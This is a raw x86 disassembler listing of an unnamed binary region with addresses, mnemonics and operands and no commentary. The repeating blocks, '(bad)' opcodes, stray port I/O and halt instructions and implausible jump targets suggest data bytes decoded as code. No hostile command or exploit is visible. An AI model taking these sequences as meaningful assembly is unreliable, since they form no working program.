  41dc3b:	enter  0xc134,0x2c
  41dc3f:	int3   
  41dc40:	xor    ch,al
  41dc42:	adc    al,dl
  41dc44:	sub    al,0xd5
  41dc46:	push   esp
  41dc47:	aam    0x28
  41dc49:	sar    DWORD PTR [eax],cl
  41dc4b:	fsub   DWORD PTR [ecx+edx*8]
  41dc4e:	and    al,0xdc
  41dc50:	and    ch,bh
  41dc52:	pop    ds
  41dc53:	jecxz  0x41dbf1
  41dc55:	loope  0x41dc72
  41dc57:	pop    es
  41dc58:	arpl   bp,sp
  41dc5a:	shr    al,0x14
  41dc5d:	call   0xec52c92e
  41dc62:	mov    al,0xf0
  41dc64:	or     al,0xf0
  41dc66:	cmc    
  41dc67:	hlt    
  41dc68:	lock hlt 
  41dc6a:	clc    
  41dc6b:	clc    
  41dc6c:	add    al,0xf8
  41dc6e:	cld    
  41dc6f:	clc    
  41dc70:	add    ah,bh
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	cld    
  41dc75:	add    BYTE PTR [esp+eax*1],al
  41dc78:	clc    
  41dc79:	add    al,0x8
  41dc7b:	or     esi,esp
  41dc7d:	or     BYTE PTR [edi+ecx*1],cl
  41dc80:	lock or al,0x10
  41dc83:	adc    ah,ch
  41dc85:	adc    BYTE PTR [esi+0x56],dl
  41dc88:	push   esi
  41dc89:	adc    al,0x55
  41dc8b:	push   edi
  41dc8c:	push   ecx
  41dc8d:	sbb    BYTE PTR [ebp+0x47],al
  41dc90:	dec    ecx
  41dc91:	sbb    al,0x44
  41dc93:	inc    esp
  41dc94:	inc    eax
  41dc95:	and    BYTE PTR [ebx+0x55],cl
  41dc98:	dec    ebx
  41dc99:	and    al,0x52
  41dc9b:	push   edx
  41dc9c:	push   edx
  41dc9d:	sub    BYTE PTR [edx-0x53d35556],ch
  41dca3:	lods   al,BYTE PTR ds:[esi]
  41dca4:	test   al,0x30
  41dca6:	xchg   DWORD PTR [ecx-0x7979cb79],eax
  41dcac:	xchg   BYTE PTR [eax],bh
  41dcae:	cmc    
  41dcaf:	idiv   ecx
  41dcb1:	cmp    al,0x94
  41dcb3:	xchg   esp,eax
  41dcb4:	nop
  41dcb5:	inc    eax
  41dcb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcb8:	cwde   
  41dcb9:	inc    esp
  41dcba:	mov    ds:0xbd48a3a5,eax
  41dcbf:	mov    ebp,0xa6a64ca0
  41dcc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcc5:	push   eax
  41dcc6:	lods   al,BYTE PTR ds:[esi]
  41dcc7:	lods   al,BYTE PTR ds:[esi]
  41dcc8:	mov    al,ds:0xa4585854
  41dccd:	pop    eax
  41dcce:	pop    esp
  41dccf:	pop    esp
  41dcd0:	mov    al,ds:0x9c60605c
  41dcd5:	pusha  
  41dcd6:	fs fs cwde 
  41dcd9:	fs push 0x6c689468
  41dcdf:	ins    BYTE PTR es:[edi],dx
  41dce0:	nop
  41dce1:	ins    BYTE PTR es:[edi],dx
  41dce2:	jo     0x41dd54
  41dce4:	mov    WORD PTR [eax+0x74],?
  41dce7:	je     0x41dc71
  41dce9:	je     0x41dd63
  41dceb:	js     0x41dc71
  41dced:	js     0x41dd6b
  41dcef:	jl     0x41dc71
  41dcf1:	jl     0x41dc73
  41dcf3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41dcf8:	js     0x41dc7e
  41dcfa:	mov    BYTE PTR [eax-0x7373778c],cl
  41dd00:	jo     0x41dc8e
  41dd02:	nop
  41dd03:	nop
  41dd04:	ins    BYTE PTR es:[edi],dx
  41dd05:	nop
  41dd06:	xchg   esp,eax
  41dd07:	xchg   esp,eax
  41dd08:	push   0x64989894
  41dd0d:	cwde   
  41dd0e:	pushf  
  41dd0f:	pushf  
  41dd10:	pusha  
  41dd11:	pushf  
  41dd12:	mov    al,ds:0xa4a05ca0
  41dd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd18:	pop    eax
  41dd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd1a:	test   al,0xa8
  41dd1c:	push   esp
  41dd1d:	test   al,0xac
  41dd1f:	lods   al,BYTE PTR ds:[esi]
  41dd20:	push   eax
  41dd21:	lods   al,BYTE PTR ds:[esi]
  41dd22:	mov    al,0xb0
  41dd24:	dec    esp
  41dd25:	mov    al,0xb4
  41dd27:	mov    ah,0x48
  41dd29:	mov    ah,0xb8
  41dd2b:	mov    eax,0xbcbcb844
  41dd30:	inc    eax
  41dd31:	mov    esp,0xc03cc0c0
  41dd36:	(bad)  
  41dd37:	les    edi,FWORD PTR [eax]
  41dd39:	(bad)  
  41dd3a:	enter  0x34c8,0xc8
  41dd3e:	int3   
  41dd3f:	int3   
  41dd40:	xor    ah,cl
  41dd42:	rcl    al,1
  41dd44:	sub    al,0xd0
  41dd46:	aam    0xd4
  41dd48:	sub    ah,dl
  41dd4a:	fcomp  st(0)
  41dd4c:	and    al,0xd8
  41dd4e:	(bad)  
  41dd50:	and    ah,bl
  41dd52:	loopne 0x41dd34
  41dd54:	sbb    al,0xe0
  41dd56:	in     al,0xe4
  41dd58:	sbb    ah,ah
  41dd5a:	call   0xed29f247
  41dd5f:	in     al,dx
  41dd60:	adc    ah,ch
  41dd62:	lock lock or al,0xf0
  41dd66:	hlt    
  41dd67:	hlt    
  41dd68:	or     ah,dh
  41dd6a:	clc    
  41dd6b:	clc    
  41dd6c:	add    al,0xf8
  41dd6e:	cld    
  41dd6f:	cld    
  41dd70:	add    ah,bh
  41dd72:	add    BYTE PTR [eax],al
  41dd74:	cld    
  41dd75:	add    BYTE PTR [esp+eax*1],al
  41dd78:	clc    
  41dd79:	add    al,0x8
  41dd7b:	or     ah,dh
  41dd7d:	or     BYTE PTR [esp+ecx*1],cl
  41dd80:	lock or al,0x10
  41dd83:	adc    ah,ch
  41dd85:	adc    BYTE PTR [esp+edx*1],dl
  41dd88:	call   0xe459f5a1
  41dd8d:	sbb    BYTE PTR [esp+ebx*1],bl
  41dd90:	loopne 0x41ddae
  41dd92:	and    BYTE PTR [eax],ah
  41dd94:	fsub   QWORD PTR [eax]
  41dd96:	and    al,0x24
  41dd98:	fsub   DWORD PTR [eax+ebp*1]
  41dd9b:	sub    ah,dl
  41dd9d:	sub    BYTE PTR [esp+ebp*1],ch
  41dda0:	shr    BYTE PTR [eax+esi*1],1
  41dda3:	xor    ah,cl
  41dda5:	xor    BYTE PTR [esp+esi*1],dh
  41dda8:	enter  0x3834,0x38
  41ddac:	les    edi,FWORD PTR [eax]
  41ddae:	cmp    al,0x3c
  41ddb0:	sar    BYTE PTR [eax+eax*2],0x40
  41ddb4:	mov    esp,0xb8444440
  41ddb9:	inc    esp
  41ddba:	dec    eax
  41ddbb:	dec    eax
  41ddbc:	mov    ah,0x48
  41ddbe:	dec    esp
  41ddbf:	dec    esp
  41ddc0:	mov    al,0x4c
  41ddc2:	push   eax
  41ddc3:	push   eax
  41ddc4:	lods   al,BYTE PTR ds:[esi]
  41ddc5:	push   eax
  41ddc6:	push   esp
  41ddc7:	push   esp
  41ddc8:	test   al,0x54
  41ddca:	pop    eax
  41ddcb:	pop    eax
  41ddcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddcd:	pop    eax
  41ddce:	pop    esp
  41ddcf:	pop    esp
  41ddd0:	mov    al,ds:0x9c60605c
  41ddd5:	pusha  
  41ddd6:	fs fs cwde 
  41ddd9:	fs push 0x6c689468
  41dddf:	ins    BYTE PTR es:[edi],dx
  41dde0:	nop
  41dde1:	ins    BYTE PTR es:[edi],dx
  41dde2:	jo     0x41de54
  41dde4:	mov    WORD PTR [eax+0x74],?
  41dde7:	je     0x41dd71
  41dde9:	je     0x41de63
  41ddeb:	js     0x41dd71
  41dded:	js     0x41de6b
  41ddef:	jl     0x41dd71
  41ddf1:	jl     0x41dd73
  41ddf3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41ddf8:	js     0x41dd7e
  41ddfa:	mov    BYTE PTR [eax-0x7373778c],cl
  41de00:	jo     0x41dd8e
  41de02:	nop
  41de03:	nop
  41de04:	ins    BYTE PTR es:[edi],dx
  41de05:	nop
  41de06:	xchg   esp,eax
  41de07:	xchg   esp,eax
  41de08:	push   0x64989894
  41de0d:	cwde   
  41de0e:	pushf  
  41de0f:	pushf  
  41de10:	pusha  
  41de11:	pushf  
  41de12:	mov    al,ds:0xa4a05ca0
  41de17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de18:	pop    eax
  41de19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de1a:	test   al,0xa8
  41de1c:	push   esp
  41de1d:	test   al,0xac
  41de1f:	lods   al,BYTE PTR ds:[esi]
  41de20:	push   eax
  41de21:	lods   al,BYTE PTR ds:[esi]
  41de22:	mov    al,0xb0
  41de24:	dec    esp
  41de25:	mov    al,0xb4
  41de27:	mov    ah,0x48
  41de29:	mov    ah,0xb8
  41de2b:	mov    eax,0xbcbcb844
  41de30:	inc    eax
  41de31:	mov    esp,0xc03cc0c0
  41de36:	(bad)  
  41de37:	les    edi,FWORD PTR [eax]
  41de39:	(bad)  
  41de3a:	enter  0x34c8,0xc8
  41de3e:	int3   
  41de3f:	int3   
  41de40:	xor    ah,cl
  41de42:	rcl    al,1
  41de44:	sub    al,0xd0
  41de46:	aam    0xd4
  41de48:	sub    ah,dl
  41de4a:	fcomp  st(0)
  41de4c:	and    al,0xd8
  41de4e:	(bad)  
  41de50:	and    ah,bl
  41de52:	loopne 0x41de34
  41de54:	sbb    al,0xe0
  41de56:	in     al,0xe4
  41de58:	sbb    ah,ah
  41de5a:	call   0xed29f347
  41de5f:	in     al,dx
  41de60:	adc    ah,ch
  41de62:	lock lock or al,0xf0
  41de66:	hlt    
  41de67:	hlt    
  41de68:	or     ah,dh
  41de6a:	clc    
  41de6b:	clc    
  41de6c:	add    al,0xf8
  41de6e:	cld    
  41de6f:	cld    
  41de70:	add    ah,bh
  41de72:	add    BYTE PTR [eax],al
  41de74:	cld    
  41de75:	add    BYTE PTR [esp+eax*1],al
  41de78:	clc    
  41de79:	add    al,0x8
  41de7b:	or     ah,dh
  41de7d:	or     BYTE PTR [esp+ecx*1],cl
  41de80:	lock or al,0x10
  41de83:	adc    ah,ch
  41de85:	adc    BYTE PTR [esp+edx*1],dl
  41de88:	call   0xe459f6a1
  41de8d:	sbb    BYTE PTR [esp+ebx*1],bl
  41de90:	loopne 0x41deae
  41de92:	and    BYTE PTR [eax],ah
  41de94:	fsub   QWORD PTR [eax]
  41de96:	and    al,0x24
  41de98:	fsub   DWORD PTR [eax+ebp*1]
  41de9b:	sub    ah,dl
  41de9d:	sub    BYTE PTR [esp+ebp*1],ch
  41dea0:	shr    BYTE PTR [eax+esi*1],1
  41dea3:	xor    ah,cl
  41dea5:	xor    BYTE PTR [esp+esi*1],dh
  41dea8:	enter  0x3834,0x38
  41deac:	les    edi,FWORD PTR [eax]
  41deae:	cmp    al,0x3c
  41deb0:	sar    BYTE PTR [eax+eax*2],0x40
  41deb4:	mov    esp,0xb8444440
  41deb9:	inc    esp
  41deba:	dec    eax
  41debb:	dec    eax
  41debc:	mov    ah,0x48
  41debe:	dec    esp
  41debf:	dec    esp
  41dec0:	mov    al,0x4c
  41dec2:	push   eax
  41dec3:	push   eax
  41dec4:	lods   al,BYTE PTR ds:[esi]
  41dec5:	push   eax
  41dec6:	push   esp
  41dec7:	push   esp
  41dec8:	test   al,0x54
  41deca:	pop    eax
  41decb:	pop    eax
  41decc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41decd:	pop    eax
  41dece:	pop    esp
  41decf:	pop    esp
  41ded0:	mov    al,ds:0x9c60605c
  41ded5:	pusha  
  41ded6:	fs fs cwde 
  41ded9:	fs push 0x6c689468
  41dedf:	ins    BYTE PTR es:[edi],dx
  41dee0:	nop
  41dee1:	ins    BYTE PTR es:[edi],dx
  41dee2:	jo     0x41df54
  41dee4:	mov    WORD PTR [eax+0x74],?
  41dee7:	je     0x41de71
  41dee9:	je     0x41df63
  41deeb:	js     0x41de71
  41deed:	js     0x41df6b
  41deef:	jl     0x41de71
  41def1:	jl     0x41de73
  41def3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41def8:	js     0x41de7e
  41defa:	mov    BYTE PTR [eax-0x7373778c],cl
  41df00:	jo     0x41de8e
  41df02:	nop
  41df03:	nop
  41df04:	ins    BYTE PTR es:[edi],dx
  41df05:	nop
  41df06:	xchg   esp,eax
  41df07:	xchg   esp,eax
  41df08:	push   0x64989894
  41df0d:	cwde   
  41df0e:	pushf  
  41df0f:	pushf  
  41df10:	pusha  
  41df11:	pushf  
  41df12:	mov    al,ds:0xa4a05ca0
  41df17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df18:	pop    eax
  41df19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df1a:	test   al,0xa8
  41df1c:	push   esp
  41df1d:	test   al,0xac
  41df1f:	lods   al,BYTE PTR ds:[esi]
  41df20:	push   eax
  41df21:	lods   al,BYTE PTR ds:[esi]
  41df22:	mov    al,0xb0
  41df24:	dec    esp
  41df25:	mov    al,0xb4
  41df27:	mov    ah,0x48
  41df29:	mov    ah,0xb8
  41df2b:	mov    eax,0xbcbcb844
  41df30:	inc    eax
  41df31:	mov    esp,0xc03cc0c0
  41df36:	(bad)  
  41df37:	les    edi,FWORD PTR [eax]
  41df39:	(bad)  
  41df3a:	enter  0x34c8,0xc8
  41df3e:	int3   
  41df3f:	int3   
  41df40:	xor    ah,cl
  41df42:	rcl    al,1
  41df44:	sub    al,0xd0
  41df46:	aam    0xd4
  41df48:	sub    ah,dl
  41df4a:	fcomp  st(0)
  41df4c:	and    al,0xd8
  41df4e:	(bad)  
  41df50:	and    ah,bl
  41df52:	loopne 0x41df34
  41df54:	sbb    al,0xe0
  41df56:	in     al,0xe4
  41df58:	sbb    ah,ah
  41df5a:	call   0xed29f447
  41df5f:	in     al,dx
  41df60:	adc    ah,ch
  41df62:	lock lock or al,0xf0
  41df66:	hlt    
  41df67:	hlt    
  41df68:	or     ah,dh
  41df6a:	clc    
  41df6b:	clc    
  41df6c:	add    al,0xf8
  41df6e:	cld    
  41df6f:	cld    
  41df70:	add    ah,bh
  41df72:	add    BYTE PTR [eax],al
  41df74:	cld    
  41df75:	add    BYTE PTR [esp+eax*1],al
  41df78:	clc    
  41df79:	add    al,0x8
  41df7b:	or     ah,dh
  41df7d:	or     BYTE PTR [esp+ecx*1],cl
  41df80:	lock or al,0x10
  41df83:	adc    ah,ch
  41df85:	adc    BYTE PTR [esp+edx*1],dl
  41df88:	call   0xe459f7a1
  41df8d:	sbb    BYTE PTR [esp+ebx*1],bl
  41df90:	loopne 0x41dfae
  41df92:	and    BYTE PTR [eax],ah
  41df94:	fsub   QWORD PTR [eax]
  41df96:	and    al,0x24
  41df98:	fsub   DWORD PTR [eax+ebp*1]
  41df9b:	sub    ah,dl
  41df9d:	sub    BYTE PTR [esp+ebp*1],ch
  41dfa0:	shr    BYTE PTR [eax+esi*1],1
  41dfa3:	xor    ah,cl
  41dfa5:	xor    BYTE PTR [esp+esi*1],dh
  41dfa8:	enter  0x3834,0x38
  41dfac:	les    edi,FWORD PTR [eax]
  41dfae:	cmp    al,0x3c
  41dfb0:	sar    BYTE PTR [eax+eax*2],0x40
  41dfb4:	mov    esp,0xb8444440
  41dfb9:	inc    esp
  41dfba:	dec    eax
  41dfbb:	dec    eax
  41dfbc:	mov    ah,0x48
  41dfbe:	dec    esp
  41dfbf:	dec    esp
  41dfc0:	mov    al,0x4c
  41dfc2:	push   eax
  41dfc3:	push   eax
  41dfc4:	lods   al,BYTE PTR ds:[esi]
  41dfc5:	push   eax
  41dfc6:	push   esp
  41dfc7:	push   esp
  41dfc8:	test   al,0x54
  41dfca:	pop    eax
  41dfcb:	pop    eax
  41dfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcd:	pop    eax
  41dfce:	pop    esp
  41dfcf:	pop    esp
  41dfd0:	mov    al,ds:0x9c60605c
  41dfd5:	pusha  
  41dfd6:	fs fs cwde 
  41dfd9:	fs push 0x6c689468
  41dfdf:	ins    BYTE PTR es:[edi],dx
  41dfe0:	nop
  41dfe1:	ins    BYTE PTR es:[edi],dx
  41dfe2:	jo     0x41e054
  41dfe4:	mov    WORD PTR [eax+0x74],?
  41dfe7:	je     0x41df71
  41dfe9:	je     0x41e063
  41dfeb:	js     0x41df71
  41dfed:	js     0x41e06b
  41dfef:	jl     0x41df71
  41dff1:	jl     0x41df73
  41dff3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41dff8:	js     0x41df7e
  41dffa:	mov    BYTE PTR [eax-0x7373778c],cl
  41e000:	jo     0x41df8e
  41e002:	nop
  41e003:	nop
  41e004:	ins    BYTE PTR es:[edi],dx
  41e005:	nop
  41e006:	xchg   esp,eax
  41e007:	xchg   esp,eax
  41e008:	push   0x64989894
  41e00d:	cwde   
  41e00e:	pushf  
  41e00f:	pushf  
  41e010:	pusha  
  41e011:	pushf  
  41e012:	mov    al,ds:0xa4a05ca0
  41e017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e018:	pop    eax
  41e019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e01a:	test   al,0xa8
  41e01c:	push   esp
  41e01d:	test   al,0xac
  41e01f:	lods   al,BYTE PTR ds:[esi]
  41e020:	push   eax
  41e021:	lods   al,BYTE PTR ds:[esi]
  41e022:	mov    al,0xb0
  41e024:	dec    esp
  41e025:	mov    al,0xb4
  41e027:	mov    ah,0x48
  41e029:	mov    ah,0xb8
  41e02b:	mov    eax,0xbcbcb844
  41e030:	inc    eax
  41e031:	mov    esp,0xc03cc0c0
  41e036:	(bad)  
  41e037:	les    edi,FWORD PTR [eax]
  41e039:	(bad)  
  41e03a:	enter  0x34c8,0xc8
  41e03e:	int3   
  41e03f:	int3   
  41e040:	xor    ah,cl
  41e042:	rcl    al,1
  41e044:	sub    al,0xd0
  41e046:	aam    0xd4
  41e048:	sub    ah,dl
  41e04a:	fcomp  st(0)
  41e04c:	and    al,0xd8
  41e04e:	(bad)  
  41e050:	and    ah,bl
  41e052:	loopne 0x41e034
  41e054:	sbb    al,0xe0
  41e056:	in     al,0xe4
  41e058:	sbb    ah,ah
  41e05a:	call   0xed29f547
  41e05f:	in     al,dx
  41e060:	adc    ah,ch
  41e062:	lock lock or al,0xf0
  41e066:	hlt    
  41e067:	hlt    
  41e068:	or     ah,dh
  41e06a:	clc    
  41e06b:	clc    
  41e06c:	add    al,0xf8
  41e06e:	cld    
  41e06f:	cld    
  41e070:	add    ah,bh
  41e072:	add    BYTE PTR [eax],al
  41e074:	cld    
  41e075:	add    BYTE PTR [esp+eax*1],al
  41e078:	clc    
  41e079:	add    al,0x8
  41e07b:	or     ah,dh
  41e07d:	or     bl,dh
  41e07f:	or     eax,0x10100cf3
  41e084:	in     al,dx
  41e085:	add    BYTE PTR [esp+eax*1],al
  41e088:	sbb    BYTE PTR [eax+ecx*1],al
  41e08b:	or     BYTE PTR [eax+ecx*1],dl
  41e08e:	or     al,0xc
  41e090:	adc    BYTE PTR [eax+esi*1],cl
  41e093:	xor    BYTE PTR [eax+esi*1],ch
  41e096:	xor    al,0x34
  41e098:	sub    BYTE PTR [eax+edi*1],dh
  41e09b:	cmp    BYTE PTR [eax+edi*1],ah
  41e09e:	cmp    al,0x2c
  41e0a0:	shr    BYTE PTR [eax+esi*1],1
  41e0a3:	xor    ah,cl
  41e0a5:	and    BYTE PTR [esp],ah
  41e0a8:	cmp    BYTE PTR [eax+ebp*1],ah
  41e0ab:	sub    BYTE PTR [eax+ebp*1],dh
  41e0ae:	sub    al,0x2c
  41e0b0:	xor    BYTE PTR [eax+edx*2],ch
  41e0b3:	push   eax
  41e0b4:	dec    esp
  41e0b5:	push   eax
  41e0b6:	push   esp
  41e0b7:	push   esp
  41e0b8:	dec    eax
  41e0b9:	push   esp
  41e0ba:	pop    eax
  41e0bb:	pop    eax
  41e0bc:	inc    esp
  41e0bd:	pop    eax
  41e0be:	pop    esp
  41e0bf:	dec    esp
  41e0c0:	mov    al,0x4c
  41e0c2:	push   eax
  41e0c3:	push   eax
  41e0c4:	lods   al,BYTE PTR ds:[esi]
  41e0c5:	inc    eax
  41e0c6:	inc    esp
  41e0c7:	push   edi
  41e0c8:	test   eax,0xa55b5953
  41e0cd:	pop    edi
  41e0ce:	pop    ebp
  41e0cf:	pop    edi
  41e0d0:	mov    eax,ds:0x9d63615b
  41e0d5:	addr16 gs addr16 cdq 
  41e0d9:	arpl   WORD PTR [ecx+0x6b],bp
  41e0dc:	xchg   ebp,eax
  41e0dd:	js     0x41e15b
  41e0df:	ins    BYTE PTR es:[edi],dx
  41e0e0:	nop
  41e0e1:	ins    BYTE PTR es:[edi],dx
  41e0e2:	jo     0x41e154
  41e0e4:	mov    WORD PTR [eax+0x64],fs
  41e0e7:	ja     0x41e072
  41e0e9:	jae    0x41e164
  41e0eb:	jnp    0x41e072
  41e0ed:	jg     0x41e16c
  41e0ef:	jg     0x41e072
  41e0f1:	jnp    0x41e074
  41e0f3:	cmp    DWORD PTR [ebp-0x79],0xffffff85
  41e0f7:	xchg   DWORD PTR [ecx-0x7d],edi
  41e0fa:	mov    DWORD PTR [ebx-0x7363678b],ecx
  41e100:	jo     0x41e08e
  41e102:	nop
  41e103:	nop
  41e104:	ins    BYTE PTR es:[edi],dx
  41e105:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41e10d:	lahf   
  41e10e:	popf   
  41e10f:	lahf   
  41e110:	popa   
  41e111:	fwait
  41e112:	mov    eax,ds:0xa5a75da3
  41e117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e118:	pop    ecx
  41e119:	mov    ds:0xb855aba9,eax
  41e11e:	mov    esp,0xb0ac50ac
  41e123:	mov    al,0x4c
  41e125:	mov    al,ds:0xb349b7a4
  41e12a:	mov    bh,0xa9
  41e12c:	mov    bh,0xa9
  41e12e:	mov    bl,0xad
  41e130:	inc    ecx
  41e131:	mov    ebx,0xd1cfc3c1
  41e136:	retf   
  41e137:	aad    0xcb
  41e139:	aad    0xc9
  41e13b:	retf   
  41e13c:	xor    eax,0x30ccdcd8
  41e141:	int3   
  41e142:	rcl    al,1
  41e144:	sub    al,0xc0
  41e146:	(bad)  
  41e147:	xlat   BYTE PTR ds:[ebx]
  41e148:	sub    ebx,edx
  41e14a:	xlat   BYTE PTR ds:[ebx]
  41e14b:	leave  
  41e14c:	xlat   BYTE PTR ds:[ebx]
  41e14d:	leave  
  41e14e:	ror    ebp,cl
  41e150:	and    ebx,ebx
  41e152:	loope  0x41e137
  41e154:	out    dx,eax
  41e155:	icebp  
  41e156:	jmp    0x41e14d
  41e158:	jmp    0x41e14f
  41e15a:	jmp    0xfd39f74a
  41e15f:	in     al,dx
  41e160:	adc    ah,ch
  41e162:	lock lock or al,0xe0
  41e166:	in     al,0xf7
  41e168:	or     ebx,esi
  41e16a:	imul   ecx
  41e16c:	imul   ecx
  41e16e:	repz in eax,dx
  41e170:	add    ebx,edi
  41e172:	add    DWORD PTR [ebx],eax
  41e174:	movups XMMWORD PTR [ebx],xmm1
  41e177:	adc    eax,0xb09150b
  41e17c:	cmc    
  41e17d:	sbb    BYTE PTR [esp+ecx*1],bl
  41e180:	lock or al,0x10
  41e183:	adc    ah,ch
  41e185:	add    BYTE PTR [edi+edx*1],al
  41e188:	jmp    0x174af8a0
  41e18d:	or     DWORD PTR [ebx],edx
  41e18f:	or     eax,0x23211be1
  41e194:	das    
  41e195:	xor    DWORD PTR [ebx],ebp
  41e197:	xor    eax,0x2b29352b
  41e19c:	aad    0x38
  41e19e:	cmp    al,0x2c
  41e1a0:	shr    BYTE PTR [eax+esi*1],1
  41e1a3:	xor    ah,cl
  41e1a5:	and    BYTE PTR [edi+esi*1],ah
  41e1a8:	leave  
  41e1a9:	xor    esi,DWORD PTR [edi]
  41e1ab:	sub    DWORD PTR [edi],esi
  41e1ad:	sub    DWORD PTR [ebx],esi
  41e1af:	sub    eax,0x43413bc1
  41e1b4:	dec    edi
  41e1b5:	push   ecx
  41e1b6:	dec    ebx
  41e1b7:	push   ebp
  41e1b8:	dec    ebx
  41e1b9:	push   ebp
  41e1ba:	dec    ecx
  41e1bb:	dec    ebx
  41e1bc:	mov    ch,0x58
  41e1be:	pop    esp
  41e1bf:	dec    esp
  41e1c0:	mov    al,0x4c
  41e1c2:	push   eax
  41e1c3:	push   eax
  41e1c4:	lods   al,BYTE PTR ds:[esi]
  41e1c5:	inc    eax
  41e1c6:	inc    esp
  41e1c7:	push   edi
  41e1c8:	test   eax,0x57495753
  41e1cd:	dec    ecx
  41e1ce:	push   ebx
  41e1cf:	dec    ebp
  41e1d0:	mov    eax,ds:0x6f63615b
  41e1d5:	jno    0x41e242
  41e1d7:	jne    0x41e244
  41e1d9:	jne    0x41e244
  41e1db:	imul   edx,DWORD PTR [ebp-0x6f938388],0x6c
  41e1e2:	jo     0x41e254
  41e1e4:	mov    WORD PTR [eax+0x64],fs
  41e1e7:	ja     0x41e172
  41e1e9:	jae    0x41e264
  41e1eb:	jnp    0x41e172
  41e1ed:	jg     0x41e26c
  41e1ef:	jg     0x41e172
  41e1f1:	jnp    0x41e174
  41e1f3:	cmp    DWORD PTR [ebp-0x79],0xffffff85
  41e1f7:	xchg   DWORD PTR [ecx-0x7d],edi
  41e1fa:	mov    DWORD PTR [ebx-0x7363678b],ecx
  41e200:	jo     0x41e18e
  41e202:	nop
  41e203:	nop
  41e204:	ins    BYTE PTR es:[edi],dx
  41e205:	add    BYTE PTR [edi+edx*4-0x64666c97],0x65
  41e20d:	lahf   
  41e20e:	popf   
  41e20f:	lahf   
  41e210:	popa   
  41e211:	fwait
  41e212:	mov    eax,ds:0xa5a75da3
  41e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e218:	pop    ecx
  41e219:	mov    ds:0xb855aba9,eax
  41e21e:	mov    esp,0xb0ac50ac
  41e223:	mov    al,0x4c
  41e225:	mov    al,ds:0xb349b7a4
  41e22a:	mov    ecx,0xbdbf45bb
  41e22f:	mov    edi,0xc3c1bb41
  41e234:	cmp    eax,0x39c7c5c7
  41e239:	ret    
  41e23a:	leave  
  41e23b:	retf   
  41e23c:	xor    eax,0x30ccdcd8
  41e241:	int3   
  41e242:	rcl    al,1
  41e244:	sub    al,0xc0
  41e246:	(bad)  
  41e247:	xlat   BYTE PTR ds:[ebx]
  41e248:	sub    ebx,edx
  41e24a:	xlat   BYTE PTR ds:[ebx]
  41e24b:	leave  
  41e24c:	xlat   BYTE PTR ds:[ebx]
  41e24d:	leave  
  41e24e:	ror    ebp,cl
  41e250:	and    ebx,ebx
  41e252:	loope  0x41e237
  41e254:	out    dx,eax
  41e255:	icebp  
  41e256:	jmp    0x41e24d
  41e258:	jmp    0x41e24f
  41e25a:	jmp    0xfd39f84a
  41e25f:	in     al,dx
  41e260:	adc    ah,ch
  41e262:	lock lock or al,0xe0
  41e266:	in     al,0xf7
  41e268:	or     ebx,esi
  41e26a:	imul   ecx
  41e26c:	imul   ecx
  41e26e:	repz in eax,dx
  41e270:	add    ebx,edi
  41e272:	add    DWORD PTR [ebx],eax
  41e274:	movups XMMWORD PTR [ebx],xmm1
  41e277:	adc    eax,0xb09150b
  41e27c:	cmc    
  41e27d:	sbb    BYTE PTR [esp+ecx*1],bl
  41e280:	lock or al,0x10
  41e283:	adc    ah,ch
  41e285:	add    BYTE PTR [edi+edx*1],al
  41e288:	jmp    0x174af9a0
  41e28d:	or     DWORD PTR [ebx],edx
  41e28f:	or     eax,0x23211be1
  41e294:	das    
  41e295:	xor    DWORD PTR [ebx],ebp
  41e297:	xor    eax,0x2b29352b
  41e29c:	aad    0x38
  41e29e:	cmp    al,0x2c
  41e2a0:	shr    BYTE PTR [eax+esi*1],1
  41e2a3:	xor    ah,cl
  41e2a5:	and    BYTE PTR [edi+esi*1],ah
  41e2a8:	leave  
  41e2a9:	xor    esi,DWORD PTR [edi]
  41e2ab:	sub    DWORD PTR [edi],esi
  41e2ad:	sub    DWORD PTR [ebx],esi
  41e2af:	sub    eax,0x43413bc1
  41e2b4:	dec    edi
  41e2b5:	push   ecx
  41e2b6:	dec    ebx
  41e2b7:	push   ebp
  41e2b8:	dec    ebx
  41e2b9:	push   ebp
  41e2ba:	dec    ecx
  41e2bb:	dec    ebx
  41e2bc:	mov    ch,0x58
  41e2be:	pop    esp
  41e2bf:	dec    esp
  41e2c0:	mov    al,0x4c
  41e2c2:	push   eax
  41e2c3:	push   eax
  41e2c4:	lods   al,BYTE PTR ds:[esi]
  41e2c5:	inc    eax
  41e2c6:	inc    esp
  41e2c7:	push   edi
  41e2c8:	test   eax,0x57495753
  41e2cd:	dec    ecx
  41e2ce:	push   ebx
  41e2cf:	dec    ebp
  41e2d0:	mov    eax,ds:0x6f63615b
  41e2d5:	jno    0x41e342
  41e2d7:	jne    0x41e344
  41e2d9:	jne    0x41e344
  41e2db:	imul   edx,DWORD PTR [ebp-0x6f938388],0x6c
  41e2e2:	jo     0x41e354
  41e2e4:	mov    WORD PTR [eax+0x64],fs
  41e2e7:	ja     0x41e272
  41e2e9:	jae    0x41e362
  41e2eb:	imul   esi,DWORD PTR [edi+0x69],0x7b816d73
  41e2f2:	add    DWORD PTR [ebx-0x6a746e71],0x8b89958b
  41e2fc:	jne    0x41e296
  41e2fe:	pushf  
  41e2ff:	mov    WORD PTR [eax-0x74],?
  41e302:	nop
